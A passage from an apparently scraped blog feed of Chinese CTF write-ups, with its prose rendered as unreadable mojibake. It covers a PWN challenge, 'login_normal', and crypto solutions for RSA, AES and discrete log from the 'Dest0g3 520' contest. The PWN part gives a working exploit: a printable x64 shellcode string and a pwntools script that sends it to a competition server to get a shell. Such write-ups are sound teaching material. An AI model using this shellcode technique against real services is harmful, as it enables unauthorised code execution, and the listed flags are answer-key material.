class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino">[player@engine<span class="hljs-number">-1</span> cube-challenge]$ sh player.sh <br>mkdir: cannot create directory â€˜libâ€™: <span class="hljs-built_in">File</span> exists<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;script_run&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;test_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;hacker_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;server_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;copy_plugin&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user1_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_output&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&#123;useless_flag&#125;&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&#123;7b352ef0-1bb1-41af-a7d7-b74f62ff23f0&#125;&quot;</span>&#125;<br><br><span class="hljs-meta"># flag&#123;7b352ef0-1bb1-41af-a7d7-b74f62ff23f0&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸‰é¢˜éƒ½åœ¨500è§£æœä¸Šâ€¦å…¨æ˜¯éé¢„æœŸäº†éƒ½ã€‚</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="login_normal"><a class="markdownIt-Anchor" href="#login_normal"></a> login_normal</h2><p>åœ¨å‡½æ•°ä¸­sub_DA8ä¸­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">v1 = <span class="hljs-built_in">getpagesize</span>();<br>dest = (<span class="hljs-type">void</span> *)(<span class="hljs-type">int</span>)<span class="hljs-built_in">mmap</span>((<span class="hljs-type">char</span> *)&amp;loc_FFE + <span class="hljs-number">2</span>, v1, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>v2 = <span class="hljs-built_in">strlen</span>(a1);<br><span class="hljs-built_in">memcpy</span>(dest, a1, v2);<br>((<span class="hljs-built_in">void</span> (*)(<span class="hljs-type">void</span>))dest)();<br></code></pre></td></tr></table></figure><p>calläº†ä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™ä¸ªè€Œä¸”å†…å®¹æˆ‘ä»¬å¯ä»¥è‡ªå·±ç¡®å®šã€‚ä»¥æ­¤æ¥æ‰“shellcodeã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>  <span class="hljs-keyword">if</span> ( !isprint(a1[i]) &amp;&amp; a1[i] != <span class="hljs-number">10</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;oh!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span> ( f1 != <span class="hljs-number">1</span> )<br>&#123;<br>  puts(<span class="hljs-string">&quot;oh!&quot;</span>);<br>  <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šæ–¹æœ‰ä¸¤ä¸ªå€¼éœ€è¦ç»•è¿‡ã€‚è¿™ä¸¤ä¸ªå€¼åœ¨sub_CBDä¸­å¯ä»¥è¢«ä¿®æ”¹ä¸º1ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆè¿›å…¥sub_CBDå†è¿›å…¥sub_DA8ã€‚</p><p>åœ¨ä¸»æµç¨‹sub_FFDä¸­ã€‚åˆ¤æ–­è¾“å…¥å‚æ•°ä¸ºoptä¸msgã€‚æœ€åçš„switchå¯ä»¥è¿›å…¥æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ã€‚åˆ†åˆ«æ˜¯1å’Œ2.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span> ( v7 )<br>&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">sub_DA8</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">sub_EFE</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">sub_CBD</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>    <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">6</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œv7æ˜¯åœ¨ä¸Šæ–¹çš„optå‚æ•°ä¸­è½¬æ¢å¾—åˆ°çš„ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è¾“å…¥çš„å‚æ•°åŒ…å«äº†opt:1å’Œopt:2ã€‚</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">if</span> ( !strcmp(<span class="hljs-built_in">a1</span>, <span class="hljs-string">&quot;ro0t&quot;</span>) )<br>&#123;<br>  <span class="hljs-built_in">f1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">f2</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-symbol">else</span><br>&#123;<br>  <span class="hljs-built_in">f1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>sub_CBDéœ€è¦msgå‚æ•°çš„å€¼ä¸ºro0tã€‚</p><p>æ‰€ä»¥ä¸¤æ¬¡è¾“å…¥çš„å‚æ•°å¯ä»¥å¾—åˆ°ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">opt:</span><span class="hljs-number">1</span><br><span class="hljs-symbol">msg:</span>ro0t<br><span class="hljs-symbol">opt:</span><span class="hljs-number">2</span><br><span class="hljs-symbol">msg:</span>shellcode<br></code></pre></td></tr></table></figure><p>ç”±äºdestæ‰§è¡Œä¹‹å‰æ£€æŸ¥äº†å†…å®¹æ˜¯ä¸æ˜¯å…¨æ˜¯å¯æ‰“å°çš„å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬çš„shellcodeéœ€è¦è½¬æ¢æˆæ˜æ–‡ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rcx</span>        <span class="hljs-comment">; src</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; dest</span><br><span class="hljs-keyword">call</span>    _memcpy<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+dest]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_20], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>+var_20]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">rdx</span><br></code></pre></td></tr></table></figure><p>destæ˜¯ç”±rdxè¿›è¡Œè·³è½¬çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç”Ÿæˆå¯¹åº”çš„shellcodeçš„æ—¶å€™è¦ä½¿ç”¨rdxå‚æ•°ã€‚</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">â””â”€$ ./shellcode_x<span class="hljs-number">64.</span>sh rdx<br>Rh<span class="hljs-number">0666</span>TY<span class="hljs-number">1131</span>Xh<span class="hljs-number">333311</span>k<span class="hljs-number">13</span>XjiV<span class="hljs-number">11</span>Hc<span class="hljs-number">1</span>ZXYf<span class="hljs-number">1</span>TqIHf<span class="hljs-number">9</span>kDqW<span class="hljs-number">02</span>DqX<span class="hljs-number">0</span>D<span class="hljs-number">1</span>Hu<span class="hljs-number">3</span><span class="hljs-name">M2</span><span class="hljs-name">G0</span>Z<span class="hljs-number">2</span><span class="hljs-meta">o4</span>H<span class="hljs-number">0</span>u<span class="hljs-number">0</span>P<span class="hljs-number">160</span>Z<span class="hljs-number">0</span><span class="hljs-name">g7</span><span class="hljs-meta">O0</span>Z<span class="hljs-number">0</span>C<span class="hljs-number">100</span>y<span class="hljs-number">5</span><span class="hljs-meta">O3</span><span class="hljs-name">G020</span>B<span class="hljs-number">2</span><span class="hljs-symbol">n060</span><span class="hljs-symbol">N4</span>q<span class="hljs-number">0</span><span class="hljs-symbol">n2</span>t<span class="hljs-number">0</span>B<span class="hljs-number">0001010</span>H<span class="hljs-number">3</span>S<span class="hljs-number">2</span>y<span class="hljs-number">0</span>Y<span class="hljs-number">0</span><span class="hljs-meta">O0</span><span class="hljs-symbol">n0</span>z<span class="hljs-number">01340</span>d<span class="hljs-number">2</span>F<span class="hljs-number">4</span>y<span class="hljs-number">8</span>P<span class="hljs-number">115</span>l<span class="hljs-number">1</span><span class="hljs-symbol">n0</span>J<span class="hljs-number">0</span>h<span class="hljs-number">0</span>a<span class="hljs-number">070</span>t <br></code></pre></td></tr></table></figure><p>å¾—åˆ°shellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;39.107.153.91&quot;</span>, <span class="hljs-number">30443</span>)<br>r.sendline(<span class="hljs-string">b&#x27;opt:1\nmsg:ro0t\r\n&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;opt:2\nmsg:Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\r\n&#x27;</span>)<br>r.interactive()<br><br><span class="hljs-comment"># flag&#123;2781427d-0d69-460a-abf1-c2ce4529e6de&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™é¢˜ä¹Ÿæœ‰400è§£äº†â€¦å›½èµ›å±å®ææ€–â€¦</p><h1 id="é¢˜å¤–è¯"><a class="markdownIt-Anchor" href="#é¢˜å¤–è¯"></a> é¢˜å¤–è¯</h1><p>è¿™æ¯”èµ›æ‰“çš„æŒºæ— è¯­çš„ï¼Œå¯¹æˆ‘ä¸€ä¸ªä¸»æ”»Cryptoçš„äººæ¥è¯´â€¦è¿™æ¬¡Cryptoå‡ºçš„å°±â€¦æŒºæ— è¯­çš„ï¼Œè¿™ä¸‰é¢˜èƒ½å«Cryptoå—ï¼Ÿå…¨æ˜¯éé¢„æœŸâ€¦è¿˜æœ‰ç›´æ¥æ‹¿rootè´¦æˆ·çš„ï¼ŒçœŸçš„æ˜¯ååˆ†æœ‰æ„æ€ã€‚åä¸œåŒ—æ˜¯çœŸçš„å·ï¼Œéƒ½ä¸çŸ¥é“è¿™æ¬¡èƒ½ä¸èƒ½å‡ºçº¿äº†ã€‚æ‰“å®Œè¿™æ¯”èµ›æˆ‘å°±è§‰å¾—ï¼Œæˆ‘å­¦äº†è¿™ä¸€æ®µæ—¶é—´çš„CTFéƒ½ç™½å­¦äº†ã€‚å¼€å§‹æƒ³å¿µå»å¹´çš„360äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520è¿æ–°èµ›</title>
    <link href="/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <url>/2022/05/27/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>BUUçš„Dest0g3 520è¿æ–°èµ›ã€‚babyRSAã€babyAESã€ezDLPã€ezStreamã€Mr.Doctorã€Pngeniusã€EasyEncodeã€ä½ çŸ¥é“jså—ã€EasyWordã€Python_jailã€ 4096ã€simpleXORã€hi ã€ ez_arrchçš„é¢˜è§£ã€‚</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" style="zoom: 33%;" /><p>ä¿ä½äº†å‰100ï¼Œç´¯æ­»äº†éƒ½ã€‚</p><p>æœ€åä¸»åŠæ–¹æ¸…äº†ä¸€æ³¢ä½œå¼Šçš„ï¼Œå®Œèµ›åæ¥çœ‹æˆ‘ç›´æ¥70ä»¥å†…äº†ã€‚å±å®ä¹ã€‚</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = next_prime(p)<br>n = p*q<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br><span class="hljs-string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>p,qä½¿ç”¨çš„æ˜¯ç›¸é‚»çš„ä¸¤ä¸ªç´ æ•°ã€‚æ‰€ä»¥å¯ä»¥è¿›è¡Œå¼€æ–¹æ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyRSA_solve.py</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br>c = <span class="hljs-number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br>p =  sympy.prevprime(gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br>q = sympy.nextprime(p)<br><br>d = gmpy2.invert(<span class="hljs-number">65537</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>m = gmpy2.powmod(c, d, n)<br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment"># Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;</span><br></code></pre></td></tr></table></figure><h2 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>key = os.urandom(<span class="hljs-number">16</span>)<br>my_aes = AES.new(key, AES.MODE_CBC, iv)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>flag += (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">16</span>) * <span class="hljs-string">b&#x27;\x00&#x27;</span><br>c = my_aes.encrypt(flag)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(iv)<br><span class="hljs-built_in">print</span>(key)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span><br><span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span><br><span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆå§‹å‘é‡å’ŒåŠ å¯†å¯†é’¥éƒ½ç»™å‡ºæ¥äº†ï¼Œç›´æ¥è¿›è¡Œè§£å¯†å°±å¯ä»¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># babyAES_solve.py</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><br>aes = AES.new(<span class="hljs-string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span>, AES.MODE_CBC, <span class="hljs-string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(aes.decrypt(<span class="hljs-string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>x = bytes_to_long(flag)<br>g = <span class="hljs-number">19</span><br>p = <span class="hljs-number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span><br>h = <span class="hljs-built_in">pow</span>(g, x, p)<br><span class="hljs-built_in">print</span>(h)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>ç”¨SageMathæ±‚è§£å³å¯ã€‚è¿™ä¸ªåªèƒ½è¿™ä¹ˆåšäº†ï¼Œç”¨åˆ°åº”è¯¥æ˜¯BSGSç®—æ³•ï¼Œæˆ‘è‡ªå·±å†™çš„è·‘åŠå¤©è·‘ä¸å‡ºæ¥ï¼Œè¿˜æ˜¯ç”¨SageMathå¥½äº†ã€‚</p><p><a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SageMath"># sagemath<br>h = 199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162<br>p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353<br>g = 19<br>x = discrete_log(mod(h, p), mod(g, p))<br>print(hex(x))<br><br># 0x446573743067337b30376564326136662d313832662d613035642d633831652d3133313861663832306137387d<br># Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;<br></code></pre></td></tr></table></figure><h2 id="ezstream"><a class="markdownIt-Anchor" href="#ezstream"></a> ezStream</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 